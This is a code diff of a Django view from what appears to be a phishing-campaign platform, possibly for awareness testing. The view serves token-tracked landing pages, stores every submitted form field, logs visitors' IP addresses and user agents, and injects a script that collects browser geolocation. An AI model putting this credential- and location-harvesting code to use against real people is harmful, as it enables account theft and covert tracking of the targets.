@@ -64,87 +64,103 @@ def send_phishing_email(smtp_config, to_email, subject, body):
 
 @csrf_exempt
 def serve_landing_page(request, url_path, token):
-    page = get_object_or_404(LandingPage, url_path=url_path)
-    result = get_object_or_404(CampaignResult, token=token, campaign__landing_group=page.landing_group)
+    try:
+        logger.debug(f"Serving landing page: {url_path}, token: {token}")
+        page = get_object_or_404(LandingPage, url_path=url_path)
+        logger.debug(f"Landing page found: {page.name}")
+        result = get_object_or_404(CampaignResult, token=token, campaign__landing_group=page.landing_group)
 
-    if request.method == 'POST':
-        form_data = request.POST.dict()
-        
+        if request.method == 'POST':
+            form_data = request.POST.dict()
+            
 
-        if 'latitude' in form_data and 'longitude' in form_data:
-            result.latitude = form_data['latitude']
-            result.longitude = form_data['longitude']
+            if 'latitude' in form_data and 'longitude' in form_data:
+                result.latitude = form_data['latitude']
+                result.longitude = form_data['longitude']
+                result.save()
+
+            # Cargar los datos existentes o inicializar un diccionario vacío
+            existing_data = json.loads(result.post_data) if result.post_data else {}
+            
+            # Actualizar solo los campos que no están vacíos
+            for key, value in form_data.items():
+                if value.strip():  # Comprobar si el valor no está vacío después de quitar espacios
+                    existing_data[key] = value
+            
+            # Guardar los datos actualizados
+            result.post_data = json.dumps(existing_data)
+            result.status = 'form_submitted'
+            result.save()
+            
+            next_page = LandingPage.objects.filter(landing_group=page.landing_group, order__gt=page.order).order_by('order').first()
+            if next_page:
+                return redirect('serve_landing_page', url_path=next_page.url_path, token=token)
+
+        if not result.landing_page_opened:
+            result.email_opened = True
+            result.landing_page_opened = True
+            if not result.opened_timestamp:
+                result.opened_timestamp = timezone.localtime()
+            result.landing_page_opened_timestamp = timezone.localtime()
+            result.status = 'landing_page_opened'
+            result.ip_address = request.META.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip() or request.META.get('REMOTE_ADDR', '')
+            result.user_agent = request.META.get('HTTP_USER_AGENT', '')
             result.save()
 
-        # Cargar los datos existentes o inicializar un diccionario vacío
-        existing_data = json.loads(result.post_data) if result.post_data else {}
-        
-        # Actualizar solo los campos que no están vacíos
-        for key, value in form_data.items():
-            if value.strip():  # Comprobar si el valor no está vacío después de quitar espacios
-                existing_data[key] = value
-        
-        # Guardar los datos actualizados
-        result.post_data = json.dumps(existing_data)
-        result.status = 'form_submitted'
-        result.save()
-        
-        next_page = LandingPage.objects.filter(landing_group=page.landing_group, order__gt=page.order).order_by('order').first()
-        if next_page:
-            return redirect('serve_landing_page', url_path=next_page.url_path, token=token)
+        soup = BeautifulSoup(page.html_content, 'html.parser')
+        form = soup.find('form')
+        if form:
+            form['action'] = request.build_absolute_uri(f'/landing/{url_path}/{token}/')
 
-    if not result.landing_page_opened:
-        result.email_opened = True
-        result.landing_page_opened = True
-        if not result.opened_timestamp:
-            result.opened_timestamp = timezone.localtime()
-        result.landing_page_opened_timestamp = timezone.localtime()
-        result.status = 'landing_page_opened'
-        result.ip_address = request.META.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip() or request.META.get('REMOTE_ADDR', '')
-        result.user_agent = request.META.get('HTTP_USER_AGENT', '')
-        result.save()
+        # Reemplazar las rutas de las imágenes, CSS, JS y fuentes
+        for tag in soup.find_all(['img', 'link', 'script']):
+            src = tag.get('src') or tag.get('href')
+            if src:
+                if src.startswith(('http://', 'https://', '//')):
+                    continue
+                
+                # Construir la ruta correcta para los recursos
+                correct_path = f"/media/landing_pages/{page.landing_group.user.id}/{page.landing_group.name}/{src.lstrip('/')}"
+                
+                if tag.name == 'img':
+                    tag['src'] = request.build_absolute_uri(correct_path)
+                elif tag.name == 'link':
+                    tag['href'] = request.build_absolute_uri(correct_path)
+                elif tag.name == 'script':
+                    tag['src'] = request.build_absolute_uri(correct_path)
 
-    soup = BeautifulSoup(page.html_content, 'html.parser')
-    form = soup.find('form')
-    if form:
-        form['action'] = request.build_absolute_uri(f'/landing/{url_path}/{token}/')
-
-    # Reemplazar las rutas de las imágenes, CSS, JS y fuentes
-    for tag in soup.find_all(['img', 'link', 'script']):
-        src = tag.get('src') or tag.get('href')
-        if src:
-            if src.startswith(('http://', 'https://', '//')):
-                continue
-            
-            # Construir la ruta correcta para los recursos
-            correct_path = f"{settings.MEDIA_URL}landing_pages/{page.landing_group.user.id}/{page.landing_group.name}/{src.lstrip('/')}"
-            
-            if tag.name == 'img':
-                tag['src'] = request.build_absolute_uri(correct_path)
-            elif tag.name == 'link':
-                tag['href'] = request.build_absolute_uri(correct_path)
-            elif tag.name == 'script':
-                tag['src'] = request.build_absolute_uri(correct_path)
-
-    # Agregar script para solicitar la ubicación
-    location_script = soup.new_tag('script')
-    location_script.string = """
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition);
+        # Agregar script para solicitar la ubicación
+        location_script = soup.new_tag('script')
+        location_script.string = """
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendPosition);
+                }
             }
-        }
-        function sendPosition(position) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", window.location.href, true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
-        }
-        window.onload = getLocation;
-    """
-    soup.body.append(location_script)
+            function sendPosition(position) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", window.location.href, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
+            }
+            window.onload = getLocation;
+        """
+        
+        # Buscar el elemento body
+        body = soup.find('body')
+        if body:
+            body.append(location_script)
+        else:
+            # Si no hay body, agregar el script al final del HTML
+            soup.append(location_script)
 
-    return HttpResponse(str(soup))
+        logger.debug(f"HTML content before modification: {page.html_content[:500]}...")  # Primeros 500 caracteres
+        logger.debug(f"Soup object after parsing: {soup}")
+
+        return HttpResponse(str(soup))
+    except Exception as e:
+        logger.error(f"Error serving landing page {url_path}: {str(e)}")
+        return HttpResponse("Error al cargar la página", status=500)
 
 @require_GET
 def track_email_open(request, token):
@@ -167,6 +183,10 @@ def serve_media(request, path):
     if os.path.exists(file_path):
         return FileResponse(open(file_path, 'rb'))
     return HttpResponse(status=404)
+
+
+
+
 
 
 
